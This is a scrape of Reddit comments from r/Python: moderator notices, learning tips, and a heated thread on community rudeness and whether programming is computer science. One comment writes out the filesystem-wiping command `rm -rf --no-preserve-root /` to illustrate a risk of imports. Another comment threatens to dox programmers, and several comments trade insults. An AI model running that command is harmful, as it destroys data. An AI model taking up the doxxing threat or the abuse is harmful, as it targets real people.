Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
&gt; making the language the next target for boot camp scams If you were actually interested in genuine discourse you’d know that the OP wasn’t talking about that. They were talking about posts like https://www.reddit.com/r/Python/comments/abw44i/how_to_build_a_simple_python_keylogger/?st=JQGS7B23&amp;sh=ac88041b Nice “zing” though, very graybeard. Much cool.
That is very optimistic, in fact so much so that is completely wrong. Until very recently there was absolutely no way to re-import Python modules, (this feature appeared in 3.4, but is still buggy, and will never work well because read further). Importing a module in Python may run user's code. This means, importing a module may potentially change the state of your system, not to mention that the import mechanism itself is customizable and can do virtually anything, including `rm -rf --no-preserve-root /`. Running user code is not unusual neither in standard library, nor in third-party libraries. Here are some examples of things that will typically prevent you from re-importing modules: an imported module changed `sys.path` (happens more than you think). Imported module installed (or uninstalled) extra packages, module loaders, parsers, or some other related import machinery (this is usually unintended, and doesn't happen a lot, but still). Imported module created an object, that cannot be GC'ed, or, even worse, started a thread or a process, that will now prevent the program from exiting (the reload operation will appear to succeed, but, in fact, your program will start doing random undesired stuff). And there are *a lot more problems* with this.
Oh sorry about that, didn't look at the sidebar before sleepily posting it before bed ! Thanks! 
Go to the linked page. Read OP's comment there. He accused someone of being a dick when they weren't. The person had a legitimate comment. They wanted an article with a link to a GitHub repo, and not just a video. We can have a discussion about which is better (which is pretty much the whole purpose of Reddit), but simply expressing that opinion is not being a dick. That person was not insulting or mean in any way. OP is overreacting. 
I had posted my toy GitHub project here recently: https://github.com/valignatev/python-snowterm/ Now I've recorded a companion video about how to do the same with the curses module.
If you had the ability to read, you'd have realized that I comment on the "usefulness" of Python being popularized. Alas, it appears that you are unable to. 
I'm using PyCharm for remote stuff and Emacs for everything else.
A 10 minute video is a 3 minute read.
Backpedal, thanks.
Thank you for the apology! 
pretty cool. i would guess that a lot of LINQ done pythonically would be better expressed as comprehensions. basically, wherever you see \`map\` and \`filter\` both can likely be expressed as a list or dictionary comprehension
Username checks out
I can't answer most of your questions because I'm not familiar with Kivy (but I'd assume it can detect network type like you can via standard device APIs), but I can answer this one: &gt; It can contact the database via 4G/5G? Internet is internet. If your database is exposed to the internet, then you can send data to it via your mobile network. That being said, don't expose your database to the internet. You'll need some sort of API between the database and the internet.
The non-question got a non-answer, that's justice.
It’s not completely wrong, because you can. Simply providing the available Functionality supported by the python library.
&gt;Nice “zing” though, very graybeard. nice ageism snowflake.
O’Reilly and No Starch press 
import antigravity
Look, ma! Concern troll!
Oh awesome, thanks for the constructive tip. Going back now to refactor where I can to rather use list or dictionary comprehension. What's the best way to get something like an anonymous record, I used SimpleNamespace because I don't like referencing fields with magic strings, as per a dictionary for exmaple where your field name is the key via a string. What do you think recommend here?
Great work, man! &amp;#x200B; I'll try it within next week!
Maybe looks for jobs that aren't advertised as 'Python' jobs but use Python? Lots of 'web developer', 'software engineer', 'data scientist', 'full stack developer' or whatever will use Python but won't advertise the job as 'Python programmer'
pfft __import__('something').complicated.do()
Not for those who prefer videos I suppose. 
I feel like I shouldn't have to say that programming as a concept, job, and way of life means a lot of different things to different people. There would be no programming without computer science. Everything you do is manipulating electircal impules that allow you to read this right now. Now, if you choose to use it as a mere tool to help you out with things, it is defintiely no science. To *you.* But to the ones who've dedicated their lives to it and created things that have changed the world - you better believe it's a science. There are far more of them than you - and they are far more relevant. It follows that programming as a science concept is more appropriate. No computer science (i.e. manipulating electrical pules to send and "on" or "off" instructions billions of times a second and turn that into useful data via *programming* that does things like drive cars, predict consumer behavior in a almost unbelievable way) -- yes, no computer science, and there is no programming. Just because we have high level languages, like Python, that let a 10 year old do shit that was unfathomable 30 years ago doesn't mean it isn't a science. It's because of science we can do that. Stop arguing for the sake of arguing. It's vile and a very unproductive state of mind to be in. Keep your flimsy opinions to yourself, please.
I don't know if I agree with that. Unless they have difficulty reading due to an underlying condition like dyslexia, I don't see how listening to someone talk could ever be faster than reading.
&gt; they may be following me around I believe there's an algorithm that protects from that sort of thing.
Dude, keep the fuck going. The programmer community is 80% fucking dick heads. I know because I recruited them for 6 years and worked as a programmer for the past 2. They have Ego's like no other. They ALWAYS look for ways to tear you down. And they ALWAYS find something. Because you can do something in programming 1000 different ways, each with pros and cons. You will never get credit from these jags. But don't fret -- a newer generation is coming in -- with social skills and a semblance of empathy towards other people. But again, this is the internet. And that's where the worst come to tear down good people like you. Keep it the hell up! You are dope. Don't bee a fool and let mere trolls make you doubt that. As you mentioned in your video: &gt;"Let's admit it: we're all pretty awesome!" Laughed when i heard it. We need more like you! good luck brother. &amp;#x200B;
\*downvote\* Lol you CANNOT win with you people. Lol. Funny, i was a damn good recruiter because I knew within seconds whetherthe candidate was a self-absorbed shit-bag or a decent, humble person (See: the ones who get the jobs). Enough of all of you, already. You make the world a worse place.
This may be true for some videos and some articles, however it does not change my argument.
If the content is visual in nature, sure. Most of the videos of this nature posted to /r/python don't really benefit from the format.
Thank you . You're absolutely right. I'm always forgetting to set tangible goals. When I said I had a great start, I did create a super simple text adventure that I can play on the terminal. I was on fire with def functions! I just never went beyond that because I became overwhelmed with class methods and trying to remember what does what. I have to say, however, trying different learning materials really helps you to get out of that tunnel vision. I started out with Learn Python the Hard Way and well... guess I really hit the 'hard' of it when it asked me to memorize a bunch of phrases which I had no context in. And a few more pages beyond that it told me not to move onto until I did so... what was I to do? was just followin' directions. 
Are you keeping all of this in github or other source control? Sorry for the unsolicited 2 cents, but, as a team lead, when I see a history of personal projects over time, my impression is that of being both interested and serious about the field and their career. (NOT saying that lack of a github, or other, account implies the opposite.) Where you might think, "oh no, they shouldn't see this learning stuff", I see x months/years of optional professional development and steady improvement and iteration. Use private repos to hide certain things. I am not aware of a way to back-date anything in github, so your evidence of the work that you are doing right now, when or if you choose to make it public, could be the differentiator between you and another candidate.
Lololol. I just can't believe what the internet turned people into. If you have an opinion, with absolutely no *meaningful* basis or point whatsoever, you will make sure it is known. Not just that, but you make sure to scoff something as absulrd as saying "programming isn't a science." Yeah, scraping Fantasy football stats isn't a science. Building multi-core, microscopic processors, the firmware for operating systems, high-frequency trading algorithms, i could go on. Damn it. This is moot. You're point is probably gonna be to the likes of "science only chemistry and physics duhhhh." The internet has made us dumber. You can crawl into any world you want and make it reality.
You mean if i piss off 1000 trolls they can't go through my history and downvote? Or just not all the downvotes would count?
I had some similar difficulties trying to compile Python. Eventually, I learned one of the packages I was using that worked fine on my desktop did not work on my android. The compiled app would always fail or not compile at all. The error messages through compiling were not very helpful, but when I skipped the compiled step and ran it directly on the android using kivy smart launcher I was finally able to diagnose the problem and fix it. I share not as a criticism of Python, but just in case my struggle as a first time app developer could help others. 
The book Python Crash Course is a good place to start.
Oh yeah. Having my work computer, laptop, and home computer, I use GitHub all the time, even just for it to be useful cloud storage for myself lol. Found out that GitHub offers free unlimited private repos for students, and decided to learn the ways of the Git, and now I use it everyday. I didn't think about using it though to vet coding experience though, so that's a good tip, thank you. However, if I work on a project for work, I wouldn't necessarily have permission for other people to go rooting around the code on GitHub as a means of helping me get a new job, right? You're just referring to personal/student projects?
&gt;AlSweigart Thanks! Love your book!
They did use a python a few times[a few times](https://www.oreilly.com/animals.csp?x-search=Python&amp;x-sort=animal). :)
what's about django-polymorphic? ;)
making bots in different social media 
Made my own clipboard that behaves like a queue rather than a "I can only remember one thing" board. Being a developer, there are several scenarios when I just wanna copy 5 different elements and then paste them in order, rather than grabbing a huge section of code or having to do 5 separate copy/paste cycles.
Reddit destroyed your code. Make sure constructor has two "_" characters on each side: `def __init__(...):`
I believe the algorithm detects patterns and won't actually count them, but still displays them to that user.
cheers. It worked
This question is perfect for /r/learnpython :)
Yes, yes, of course, personal projects or projects/tutorials from books and online classes, etc. Side story...My step-son is in college now, for CS, but when he was in high school and doing Minecraft mods I got him on to GitHub. His current part-time developer job looked at his github repos as evidence of his long term interest and motivation; because he had almost 3 years of history at that point. Plus, when he was a freshman in high school it was so exciting for him to see people using his mod. So, I tell everyone it's never to early to at least start a repo. :)
In your complaint, I see a confusion between disapproval and being a dick. The poster under scrutiny said that they 'wish' people would write repo-backed blog posts instead of videos. It was a general response to a particular post. It wasn't particularly nice, but it wasn't an ad hominem, nor was it unconstructive. Indeed, there are credible reasons for why a repo a useful alternative (people learn in a variety of different ways). The real 'dicks' are people who want to bring the conversation as a whole down for their own enjoyment (cynics), not those who dare express an alternative viewpoint. What you're advocating for, making a community where people can come to learn and explore what python is all about, is fine. But it is undermined by the fact that you're tone policing someone who sees the means to that end differently than you do.
Apart from EVE there aren't a whole lot of python deployments in the gaming world. If you're developing a game for yourself, python would be fun. If you aim to sell it, you'll have started on an uphill icy path though.
Speaking as more of an outsider (I just use Python for little projects here and there, certainly not a master programmer by any stretch), I'm just glad to have a sub with resources on a variety of related topics, rather than constant spam with a screencap of a 'Hello World' program with the sub title "My Journey Begins!" I totally get the criticism, but this sub isn't bad, at least by reddit standards.
&gt;I really wish people would stop making videos and instead write an article linked to a github repo. Not an order, no explicit argument that they are better in the absolute sense. What are you getting on about? &amp;#x200B;
Programming still isn’t computer science. &gt; it’s because of science we can do that Science allows us to build planes. Is flying a plane science? No. &gt; stop arguing for the sake of arguing. It’s vile and very unproductive Stop using language loosely and making terrible arguments and sure, I’ll stop.
The worst part about that comment is the meaning: those old guys are jerks, don't care about others. But us, ME, we're woke. 
People go get CS degrees every year because they want to do programming and literally don’t realize that they aren’t the same thing. Just because something isn’t immediately of use to you don’t make it useless. Go crawl back into your reality now.
Hey. Sorry forgot to include what OS I’m using. I’m using macOS. I’m happy with ST so far. Needed to install some plugins though (like diff, I like the diff in VS Code). I can’t complain. As long as I’m productive, I’m happy. 
Hey. Sorry forgot to include what OS I’m using. I’m using macOS. I’m happy with ST so far. Needed to install some plugins though (like diff, I like the diff in VS Code). I can’t complain. As long as I’m productive, I’m happy. 
Is this an SQL injection?
Wow, that's pretty good!
Because people can’t take a joke even if it doesn’t hurt anyone 
Tell me about one Computer Scientist that doesn't program. It's called an ox-moron. Yeah. Tell me more about how people don't apply their majors. A bachelors is ENTRY level shit. Like pre-med. You're no doctor after going to school and nabbing a chem degree. Spare me your brainless arguments..for the love of god. I'm sorry, You're just everywhere! As long as you have some generalized anecdote - i mean, to you, that's all you need to spew your mouth. I do know one thing: you are most definitely the furthest thing from a scientist. You obviously don't apply yourself and you do the bare minimum to skate by. So are all your "friends" out here backing you on this abject nonsense. 
Giving constructive criticism is not being a dick. Don't go full Kenneth Reitz. Articles are a fundamentally better option than a video. * time * ease of accesses * understandablity * etc Downvoting isn't being a dick either. Things like gatekeeping, or circular discussion where one side is "I'm right because I said so", or actually rude comments are being a dick. But that guy just got constructive criticism.
Can you share?
Thanks OP, this looks like it will be useful. If anyone's interested, I also found [this site](https://python-patterns.guide/) by Brandon Rhodes that seems to address similar topics. Lots of examples of classic "Gang of Four" patterns and why they may not be necessary in Python.
Computer science is an extremely wide field. There are jobs such as hardware engineering, network architecture management, information security, information systems, and more, all of which don't *need* any programming whatsoever. Programming is more commonly taught in American universities now under the major, but not all do, and it is still a great and useful skill. But while a programmer can be a computer scientist and a computer scientist can be a programmer, not all are both. Regardless of argument, for someone agreeing with the OP so much about dicks you seem to be dicking around yourself quite a bit too.
that's beautiful, thanks for pointing it out.
Sure. The fucks I give? Not 1. The true programmer way: twist and bend semantics to best fit your version of what's "right." It's literally uncanny how similar you all are.
I see. thanks for the offer, but sadly for me, I'm not working there. Thanks !
It will be the same trouble getting the Python interpreter installed. That company (or part of..) is very behind..
As a moderator, I certainly agree with the title - we shouldn't be dicks to each other. However, I do not agree that giving feedback is the same as being a dick. We can probably all be a little bit better in our interactions, but it's a two way street - don't be a dick, but don't automatically assume that the other person is being a dick either.
Im an entry level guy. First programming job.
What the fuck man I go in calmly trying to explain something and you're already whipping your dick out and smacking people with it. It's not semantics. I quite literally gave you examples. And if you haven't gone to college yet, then when you apply, speak to your advisor and they will gladly tell you how there's far more to computer science than just programming.
It's an arguement that should not be one. Again, Programming is heavily tied to CS. Sure, there are ways it's not. But why the fuck nit-pick?
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
and i don't mean to go sideways on you. sometimes i lose track of who's beefing with me and who's being cordial. Took it too far, so i apologize.
I've made tutorial videos for basic Python subjects. Some people simply enjoy them more than reading, even if there's no disability in play. I've had people tell me that it helps to see what I'm clicking where when I'm moving around environments, or that they like watching the code run in real time. Heck, some just like the sound of a human voice explaining things.
It isn't an argument nor a nitpick. There are computer scientists who can only even right now work in theoretical or large scale finite state machines and they give their work to others to translate to either physical hardware or virtual software infrastructure. Not all programmimg is CS and visa versa, period. Imagine a venn diagram. Programming on the left. CS on the right. Only the middle is both. This is well established since at least the 1930s and the time of people like Turing and disciplines such as lambda calculus. It's not an opinion. It's a known historical fact that remains true today. Trust me when I say I, and many others, got my degree to get a job that involved programmimg. In my case it's because I like it intrinsically, in other cases it's usually for the same mistake you keep stating. But you will have positions with little to no programming whatsoever throughout your career. Coincidentally, the programming-onlys usually stick at a lower salary than those who are willing to be promoted to systems analysts or major administrators.
I just became dumber.
I'm not saying that you shouldn't make tutorial videos for Python, I was just making the argument that you can't equate a 10 minute video's contents to a 10 minute read's contents, unless the person doing the reading has a disability.
"yeah, I'm a Computer scientist, baby. Don't know shit about programming so I just put the metal together. Cant turn on -- cant do shit! But those things need instruction. But, again, I'm a computer scientist, NOT a programmer." &amp;#x200B; LOLOL
Haha, that is an awesome story! I remember the old days when I was messing with Papyrus in Skyrim (an in-house OOP scripting langauge Bethesda Game Studios released to the public for their Skyrim game). If I had that same foresight, no telling what would be different. Very awesome for him to hit the ground running with that.
I think simple namespace is fine for that use. 
I wish he would update that for Python 3.
It all depends on retention. I've been to talks where a thirty minute talk could have been a ten minute read, but years later, I still retain the material because it was engaging on more than one level. 
Hehe. First I read panda droppings... I’m like whaaaa?
You might try Godot, especially if you're interested in 2D game programming. A few months ago I switched from Unity to Godot for a hobby project and love it. Although the community is smaller the Unity's, and there are fewer assets/resources, I am far more productive. With Unity I kept getting stuck, spending most of my time figuring out how to do things. With Godot I find the path from idea to working code far smoother. It's several steps above GameMaker in terms of flexibility. [https://godotengine.org/](https://godotengine.org/) The primary language is GDScript is *very* similar to Python. C# or C++ are also supported as official languages should you want them. [https://docs.godotengine.org/en/3.0/getting\_started/step\_by\_step/scripting.html](https://docs.godotengine.org/en/3.0/getting_started/step_by_step/scripting.html) There's an active Reddit community: [https://www.reddit.com/r/godot/](https://www.reddit.com/r/godot/) Here's a [video series on making a Match3 game](https://www.youtube.com/playlist?list=PL4vbr3u7UKWqwQlvwvgNcgDL1p_3hcNn2), to give you a sense of what's involved. Here's a [series on making a platformer](https://youtu.be/wETY5_9kFtA).
It's still the Python
XD another markov
Can you use pypi dependencies and asyncio?
But a 30 minute talk is still a 10 minute read. That's the only point I was making.
I prefer the current state of affairs.
And a recurrent neural network.
You're making it very clear that you don't deserve much respect.
Nobody was a dick. It's arguably bad content.
Thank you all for the in-depth info! I really appreciate it! :)
It's linked in the video :) But yes, good stuff.
Jump to ~5:30 for the actual content.
With it being possible that there's less retention, which means the ten minute read may have less value to some people than the 30 minute talk.
I don't. not yet. But i know what I'm talking about and I sure as hell know the type of people I'm dealing with.
If you insist... Text is inherently more accessible than video, and not just for people with disabilities. In situations where bandwidth is an issue (like inside any large building that you don't have the wifi password for), text will work, and video won't. Text is easy to consume in situations where you don't want to disturb the people around you. Text is accessible to software (like crawlers) making it easier to find using search engines. Text can be consumed at the pace of the consumer, not at the pace of the producer. Posting text to Reddit, vs posting a video, is far more suitable for the people using the site. Let's be honest with ourselves: we're here to waste time. Hopefully we're wasting time in-between the really important stuff we should be doing, and not in lieu of that important stuff. Text means I can focus on the content in a way that makes the most sense for my current situation. Text means I can hear my surroundings while consuming it. Text doesn't distract others with moving images. Your claims of retention are anecdotal at best. I can't stand watching people talk about actual programming, unless they're doing something that requires a visual component. If it's just code, please just write. It's my anecdote vs yours.
@yawpitch I did try the hpy approach, but the script I'm trying to use, won't work with Python27. hpy failed in my case. Gonna try out the other ways lately.
BLAS (or LAPACK) is not called upon for simple multiplication of arrays/scalars, it is only linear algebra routines (e.g. dot(), eigh()) that use it in NumPy.
&gt; ModuleNotFoundError: No module named 'something' :P
Thanks for letting us know.
Pro tip: if your arguments are that impacted by whether you’re “beefing” with someone, you should re-evaluate.
I think OP was talking about you.
This is a difficult "telling others what to do" statement for me. How is telling others to stop telling others to align with their sensitivities not just insisting on folks abiding by one's own sensitivities? (i.e., a sensitivity to sensitivities).
Yes I certainly prefer reading to watching for almost anything, but I can also certainly appreciate that videos are preferable to others. 
With a web app you don't have to think about delivering updates to users. Every active bug would be on the current version, not having to worry about that user who is still on version 0.1 and complains about a bug resolved six updates ago.
But no YouTube ad-revenue 
Funny thing - in my undergrad it depends on what school you got your CS degree in. College of Arts - Bachelor of Arts in Computer Science - which sounds like a contradiction. College of Engineering - Bachelor of Science in Computer Science.
I think there's a pretty easy middle ground. "Nice video. I think people could learn more from your example if you made the code available on gitub or some other code repo."
sounds like building software in in the late 90's. not really wroth blogging about IMO. 
Best way to work with Kivy is to use their VM image.
Sure. BA's probably for an education sector of Comp Sci. Maybe even a legal avenue or reporter. All I'm saying is if you want to make great things, you need to be a scientist. Just like anything else. I'm not talking about script kiddies I'm talking about people who redifine the industry. But I'm wrong.
check out the pinned comment, bro. I build people up - and I kick shit in the face of bullies whenever I can. [https://www.youtube.com/watch?v=\_FVvlJDQTxk&amp;index=4&amp;list=PLhTjy8cBISErYuLZUvVOYsR1giva2payF](https://www.youtube.com/watch?v=_FVvlJDQTxk&amp;index=4&amp;list=PLhTjy8cBISErYuLZUvVOYsR1giva2payF) It's personal. Your culture of how you treat people probably put 10 months on my learning curve. I will fight against you every chance I get.
Your submission has been automatically removed. Your reddit account must be older than 2 weeks before you can post. No exceptions. You can repost this when your account is old enough. This helps prevent spam. **If you need help with Python** see r/learnpython or r/learnprogramming. **WARNING** Reposting this under a different account before 2 weeks risks getting both accounts banned as well as domains in the post. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/Python) if you have any questions or concerns.*
Webapps are usually the way to go these days.
&gt; I think you are acting like a big whinny baby. Are you trying to be ironic? Does name calling really make your point, or is the evidence in the next sentence sufficient? 
Singletons - but does a module as a singleton allow for single and multiple inheritance? no Dependency injection because you can patch over object attributes? Python doesnt need iterators? The iterator protocol is very useful in abstracting iteration in conjunction with subclassing. 
LINQ is wonderful, but there is nothing special about it. Aside from the SQL'esque variant of LINQ, the chain functions are very easy to make from scratch. That's why it seems like an afterthought in C# With python however it's different. You're using language features that are its own from the very start. Aside from the lambda functions, which I think are better made in C#. The real power of python came to me when I was doing ProjectEuler problems, in C#. I didn't know python. But I decided to try. 30 minutes later I rewrote 50 lines of C# code to Python, to just 6 lines. And it was faster. Later it took me much less time to write solutions to problems because I didn't have to write support code for the stuff. Python had it natively. I focused just on the problem. I hope that anybody reading those examples will realize that Python is better at crunching data than C#
see: [https://www.reddit.com/r/Python/comments/ac3gnl/to\_users\_here\_please\_stop\_being\_a\_dick/ed6alaj](https://www.reddit.com/r/Python/comments/ac3gnl/to_users_here_please_stop_being_a_dick/ed6alaj)
its personal. This culture is hurting people and is nothing short of atrocious. Completely shameful
haha, the person going against you's probably never heard of Djikstra (however you spell his name) and the other titans of programming. 
Can you help me understand what this project is for because from the looks of it you import hundreds of lines of code to save you two lines... Also why have you removed the post if you want community feedback?
Again, I was a tech recruiter before I began programming. There are many rock stars out there. In Silicon Valley, top the talent are treated like #1 draft picks. They get brand new BMW's for signing on bonuses. Companies fight to provide the most flashy sign on bonuses. Those are the scientists. Those are the only real programmers. Anyone else is just an admin. They aren't the doctor, they're the hospital manager. To program is to create. Why insult the profession by saying some production support admin is a programmer. They aren't. They don't create, they maintain. Programming is a verb - an action. Knowing how to writing working code isn't programming. Again, it's maintaining code the the programmers write.
I can't say I like the sentiment of just importing your problem away. Especially since Python makes is easy to _actually_ solve problems.
Internet is internet; just attempt the connection and handle the failure. Determine which adapters are available. Figure out which adapter is which. Use a try/except to attempt a connection, if it fails then you'll know you're offline. I have an example in my python module of how to get LAN/WAN ips. If you can't get a WAN ip then you are offline. Based on your use case I would just use a try/except to determine internet access. [https://github.com/jerodg/jgutils/blob/devel/jgutils/getips.py](https://github.com/jerodg/jgutils/blob/devel/jgutils/getips.py) [https://pypi.org/project/jgutils/](https://pypi.org/project/jgutils/)
I'm not sure what you mean by "pypi dependencies" in this context. Can you elaborate ? &amp;#x200B; The support of asyncio is minimal. There is a Brython-specific asyncio package in the standard distribution (cf the [documentation](http://www.brython.info/static_doc/en/asyncio.html)) but it can't run like in Cpython, because Javascript doesn't support blocking functions that could emulate `run_forever()` or `run_until_complete()`. Besides, the event loop in a browser is implicit, the need to create user-defined loops is not obvious. Events that are expected on an object are handled by code like: @bind(element, "click") def click(event): print("ok")
Where do I start learning webapps development ? 
Finally, perhaps people will stop using it already. Supporting python 2 slows down so many package developments.
Okay I see this is One of the benefit of webapps
I noticed that when Django dropped it, the critical mass changed.
I would prefer pypy for python3.6...
There are two major frameworks for building python web apps - Django and Flask. Step 1: Start reading sidebars in the subs you're visiting Step 2: r/python's sidebar will direct you to /r/learnpython Step 3: read THAT sidebar Step 4: there are a whole lot of tutorials for everything python related all over the place. Step 5: /r/flask (flask is probably the framework you should start with)
If everyone here downvoted each post they didn't like, practically nothing would have positive votes. That doesn't seem very useful to me. When you vote, remember you're in a community, and think about how your vote could provide the most value to that community. If you don't like an article, but see that others might have a different opinion, don't vote on it all. If an article isn't relevant to you, but you realise that others might find it very relevant, don't vote on it. Please reserve downvotes for articles that have incorrect information, are spam, or clearly violate the rules of /r/python, so that we avoid the tyranny of the majority.
Wouldn’t “this culture” include people hurling vile, personal attacks at those trying to engage in rational discourse with them? Look in the mirror.
Christ you’re insufferable.
That was an awesome read! Clear, simple, yet detailed, with real-life scenario. Thanks! 
Yeah, really bad dude. I'm the prick. Wound't expect any other response from you. I mean, what else can you say? I have terabytes of thread data to prove my point. And I also prove that I'm the opposite of you: I build people up. Not tear them down. Insufferable. Whatever dude. Get out the thesaurus and go to town. Fact is I struck a chord. Andif there's one thing people like you NEVER DO: it's admit they're wrong. 
I blasting those who are senslessly berating this man. Again, I stand up against bullies and kick as much shit in their face as I can. I only pray it deters some. And trust me: I'm working on a project. I wan't to find people on reddit and Github, SO, etc. Find the really nasty ones and Doxx the hell out of them. I would know: they will have a very hard time getting a job. Pretty much exactly what employers DONT want. I'm coming for you all.
In the final he could have rather replied &amp;#x200B; Excuse my French, but this is really \`from n import quoi.\` &amp;#x200B;
No, this is Patrick
I have a trade school diploma - Mainframe Service Rep - did that for a while - then self taught programming coming up through cobol / rpg / clipper / dbase /c++ MFC / delphi / VB /.net / python which is where I am now. Probably left out a dozen technologies that came and went along the way. So i'm in my fifties now. Not been blocked fro many IT dev positions, but blocked out of upper management roles for sure as they certainly want BA and prefer MBA. So its a bit harder but if you stay educated and network with people, you should do well.
I don’t get it :/
We should make a more concerted effort to push people in that direction. 
&gt; Andif there's one thing people like you NEVER DO: it's admit they're wrong ...but that's you right now.
Hello! I'm a bot! It looks to me like your post might be better suited for r/learnpython, a sub geared towards questions and learning more about python. That said, I am a bot and it is hard to tell. I highly recommend posting your question there. Please follow the subs rules and guidelines when you do post there, it'll help you get better answers faster. Show /r/learnpython the code you have tried and describe where you are stuck. **[Be sure to format your code for reddit](https://www.reddit.com/r/learnpython/wiki/faq#wiki_how_do_i_format_code.3F)** and include which version of python and what OS you are using. You can also ask this question in the r/Python discord: https://discord.gg/3Abzge7, a large, friendly community focused around the Python programming language, open to those who wish to learn the language or improve their skills, as well as those looking to help others. *** [^(README)](https://github.com/CrakeNotSnowman/redditPythonHelper) ^(|) [^(FAQ)](https://github.com/CrakeNotSnowman/redditPythonHelper/blob/master/FAQ.md) ^(|) ^(this bot is written and managed by /u/IAmKindOfCreative) ^(This bot is currently under development and experiencing changes to improve its usefulness)
Numpy and scipy are now/about to release their final 2.7 versions. It's coming...
 SyntaxError: Missing parentheses in call to 'print' 
take everything is the medicine cabinet and get woke
I guess, but I don't see a lot of editing or fancy video going on in tutorials. Mostly just someone narrating (in accents of various penetrability) live as they do write script. An article takes longer than the time type out the code you're demonstrating. That's especially true if you're including images and formatting for readability which is a lot more typical in articles. It's part of why they're better sources.
Your submission has been automatically removed. Your reddit account must be older than 2 weeks before you can post. No exceptions. You can repost this when your account is old enough. This helps prevent spam. **If you need help with Python** see r/learnpython or r/learnprogramming. **WARNING** Reposting this under a different account before 2 weeks risks getting both accounts banned as well as domains in the post. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/Python) if you have any questions or concerns.*
Foundation here we come!
A small script that checks so my local web services are running and send me a pushover notification of one is down. Took me a 1 or 2 but now I I should be able to set and forget it. On to the next!
If the problem is already solved for you, why wouldn't you import the solution and use it? Python makes it easy to solve problems, but makes it even easier to reuse previously solved ones. If that wasn't the case, it wouldn't have much in its standard library for people to use.
Do you have ready to use VM image for python 3 and would you mind sharing it? Tried to build an apk - wasted half a week, buildozer is a TOTAL nightmare :) 
You sound like a delusional nightmare.
Nice I will pay more attention to the sidebars now 
Not that I mind the drop, but I think that Pandas 0.24 will still support Python 2, it's 0.25 that will drop it: https://github.com/pandas-dev/pandas/issues/24060 Originally Pandas 0.24 was planned for October 2018, that's why it might still support Python 2.
Cool guide. I like it in video format too. Thanks for sharing!
Really, if someone has nothing/constructive to assist OP, why be denigrating? If can't be helpful, why no just 'move along'?
Cool! i'll give it a try. Thanks mate!
I like to think of it as screwing the people who already have a lot of constraints to work within.
Do you find it pretty simple to work with MSSQL and Python? I’m building something similar for my company, a personnel/systems-access tracking system; but I was about to start putting it into SQLite because it’s native to python and the whole DB I’m bringing in is tiny. 
I can't tell if those are European decimal points or misplaced commas
I'd probably start with the [requests documentation](http://docs.python-requests.org/en/master/).
Wow, this actually looks pretty neat. Going to definitely try this out.
Entry level python job posting is a rarity
VS code 
Uh upwork ? Google freelancer ?
No
As if anyone can just do that
Flask
Speaking as somebody who is hearing impaired, I get zero utility from most of the videos, even with the captions turned on. It is a lot easier for me to get information about a written language in a written form. It's also easier to translate to other human languages. I'm not saying the linked video is good or bad, just that it has very little utility for me. I don't comment on it and just move on to things that are useful to me.
